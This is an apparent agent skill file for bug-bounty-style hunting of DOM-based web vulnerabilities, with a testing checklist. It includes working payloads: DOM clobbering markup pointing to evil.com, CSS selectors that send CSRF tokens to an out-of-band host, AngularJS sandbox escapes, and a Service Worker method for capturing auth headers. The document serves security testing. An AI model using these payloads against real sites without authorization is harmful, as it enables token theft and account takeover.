---
name: hunt-dom
description: DOM-based vulnerability hunting — DOM Clobbering (markup-only injection overwrites JS globals), postMessage missing-origin-check, same-origin Service Worker abuse (persistent fetch interception → ATO), CSS attribute-selector exfil (d0nut @import recursion), jQuery CVE-2020-11022/23 mXSS, AngularJS CSTI chain, canary discipline. Use when client-side JS reads window/config, postMessage listeners, or sink-heavy SPAs exist. Trigger keywords: DOM XSS, DOM clobbering, postMessage, Service Worker abuse, CSS exfil, client-side.
---

# DOM-Based Vulnerabilities — Deep Hunting

## THE GATE
Crown jewels (server never sees payload → WAF inapplicable): DOM Clobbering (markup-only injection overwrites JS globals → DOM-XSS/auth bypass); postMessage missing-origin-check (cross-origin token theft, no XSS needed); same-origin Service Worker abuse (persistent fetch interception → ATO); CSS attribute-selector exfil (token char-by-char, zero JS).

## DOM Clobbering Payloads
`<a id="config" href="https://evil.com">`; two-element clobber `<a id="config"></a><a id="config" name="url">` → `window.config.url` = attacker element; anchor coercion `x.y → href`; nested via `<form id="a"><input id="b" name="c" value="...">`; `<base href="https://evil.com/">` bends every relative src/href. Only non-built-in globals the app reads into a sink matter.

## PostMessage
Two classes: listener trusts cross-origin data (drive sink), and sender broadcasts secrets with `targetOrigin:'*'`. Weak checks: `indexOf('target.com')>-1`/`endsWith`/`startsWith` → `target.com.evil.com`, `eviltarget.com`. Grep `addEventListener('message'` minus `.origin`; grep `postMessage(..., '*')`.

## Service Worker Hard Rule
The SW script MUST be same-origin — cross-origin script throws SecurityError. Real path: get a same-origin JS-served route (upload serving `text/javascript`, JSONP, reflected path), register from same-origin XSS, exfil every request's URL + auth header. Prove persistence (close tabs → reopen → fresh OOB hit without re-trigger).

## CSS Exfil
`input[name="csrf"][value^="a"]{background:url(https://OOB/c?p=0&c=a)}` — one request per matched first char; real exfil needs d0nut's sequential `@import` recursion. Killed by `img-src`/`style-src`/`connect-src`/`default-src` — read the CSP first.

## AngularJS CSTI
Probe `{{7*7}}` → 49 = evaluates. Standard escape `{{constructor.constructor('alert(1)')()}}`; hard variant when `$eval` gone — overwrite `String.prototype.charAt=[].join`, then `orderBy` + `String.fromCharCode`. Legacy <1.6 only.

## Validation
Clobbered value must reach a sink; unique per-test markers; body-diff the rendered DOM not raw HTML. Severity: same-origin SW = Critical; postMessage→DOM-XSS/token theft = High–Critical; clobbering→DOM-XSS = High; CSS exfil = Medium+.

## PARAMETER COVERAGE — every source, every message handler (MANDATORY)
The #1 miss: testing only the one postMessage listener or one reflected param
you noticed. DOM bugs hide in EVERY source and EVERY handler.

1. **Enumerate ALL client-side sources**: `location.hash`, `location.search`,
   `document.referrer`, `window.name`, `postMessage` data, `localStorage`/
   `sessionStorage`, cookies, `history.pushState`, `window.opener`, and every
   server-reflected value.
2. **Enumerate EVERY sink** in the bundles: `innerHTML`/`outerHTML`/
   `insertAdjacentHTML`, `document.write`, `eval`/`setTimeout`/`setInterval`/
   `new Function`, jQuery `.html()`/`.append()`/`.after()`, `element.src/href/
   action`, `location.href/assign/replace`, `setAttribute`, `ng-bind-html`/
   `v-html`, `$()` selector args.
3. **Map source→sink for EVERY pairing**, not just the classics: for each sink,
   trace which sources can reach it; test each reachable source with the
   context-appropriate payload.
4. **postMessage — test EVERY `addEventListener('message')` handler**:
   missing `.origin` check, `indexOf`/`startsWith`/`endsWith` weak checks
   (`target.com.evil.com`, `eviltarget.com`), wildcard `targetOrigin:'*'`
   sends. Drive each handler's sink with attacker frames.
5. **DOM clobbering — test EVERY markup-controlled global** the app reads into
   a sink (`config`, `window.x.y` patterns), with single-element and
   two-element clobbers, plus `<base href>`.
6. **Service Worker**: every same-origin JS-serving route as a registration
   vector; prove persistence across tab close/reopen.
7. **Re-sweep per page/route** of the SPA (each route loads different bundles).
8. **Track** `page → source/sink → payload → sink-hit?` in the journal; every
   unlogged pairing = gap.